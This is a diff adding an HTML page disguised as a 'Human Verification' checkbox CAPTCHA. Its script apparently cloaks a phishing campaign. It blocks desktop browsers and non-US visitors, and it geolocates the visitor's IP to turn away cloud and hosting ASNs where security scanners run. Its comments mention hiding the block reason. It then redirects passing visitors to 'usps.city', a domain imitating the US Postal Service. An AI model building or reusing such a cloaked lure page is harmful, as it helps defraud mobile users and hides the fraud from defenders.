@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Human Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body{
+      background:linear-gradient(135deg,#5b86e5,#36d1dc);
+      font-family:"Segoe UI",sans-serif;
+      display:flex;align-items:center;justify-content:center;
+      height:100vh;margin:0
+    }
+    .verify-card{
+      background:#fff;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,.1);
+      padding:40px 30px;width:320px;text-align:center
+    }
+    .verify-title{font-size:20px;margin-bottom:20px;font-weight:600}
+    .checkbox-group{display:flex;align-items:center;justify-content:center;margin-bottom:30px}
+    .checkbox-group input{transform:scale(1.4);margin-right:12px}
+    .checkbox-group label{font-size:16px}
+    .verify-btn{
+      background:#5b86e5;border:none;color:#fff;font-size:16px;
+      padding:10px 20px;border-radius:8px;cursor:pointer;transition:background .3s
+    }
+    .verify-btn:hover{background:#3c6fdc}
+    .footer{margin-top:25px;font-size:12px;color:#888}
+    .deny{
+      position:fixed;inset:0;background:#000c;color:#fff;display:flex;
+      flex-direction:column;align-items:center;justify-content:center;z-index:9999
+    }
+  </style>
+</head>
+<body>
+  <div id="denyMask" class="deny" style="display:none">
+    <h2 style="margin:0 0 10px">Access Denied</h2>
+    <small id="denyReason"></small>
+  </div>
+
+  <div class="verify-card" id="verifyCard">
+    <div class="verify-title" id="verifyText">Please confirm you are human</div>
+    <div class="checkbox-group">
+      <input type="checkbox" id="robotCheck">
+      <label for="robotCheck" id="labelText">I'm not a robot</label>
+    </div>
+    <button class="verify-btn" onclick="verify()">Continue</button>
+    <div class="footer" id="footerText">Human Verification Center</div>
+  </div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const lang = navigator.language || "";
+  if (lang.startsWith("zh")) {
+    document.getElementById("verifyText").textContent = "请确认您是人类用户";
+    document.getElementById("labelText").textContent  = "我不是机器人";
+    document.querySelector(".verify-btn").textContent = "继续";
+    document.getElementById("footerText").textContent = "人机验证中心";
+  }
+  deviceGate();
+  geoGate();
+});
+
+function deviceGate(){
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi/i.test(navigator.userAgent);
+  if(!isMobile){
+    deny("Desktop devices are not allowed. Please switch to a mobile network.");
+  }
+}
+
+async function geoGate(){
+  try{
+    const r = await fetch("https://ipapi.co/json/");
+    const j = await r.json();
+    const isUS = j.country === "US";
+    const suspicious = [14618,16509,15169,8075,13335,32934,16276].includes(+j.asn);
+    if(!(isUS && !suspicious)){
+      deny(`Your country / ASN → ${j.country||"?"} / ${j.asn||"?"}`);
+    }
+  }catch(e){
+    deny();               /* 静默拦截，隐藏原因 */
+  }
+}
+
+function deny(reason=""){
+  document.getElementById("verifyCard").style.display = "none";
+  document.getElementById("denyMask").style.display   = "flex";
+  if(reason){
+    document.getElementById("denyReason").textContent = reason;
+  }else{
+    document.getElementById("denyReason").style.display = "none";
+  }
+}
+
+function verify(){
+  const cb = document.getElementById("robotCheck");
+  if(cb.checked){
+    const domain = "usps.city";          // 仅暴露域名
+    window.location.href = "https://" + domain;  // 拼接协议后跳转
+  }else{
+    alert("Please complete the verification.");
+  }
+}
+</script>
+</body>
+</html>
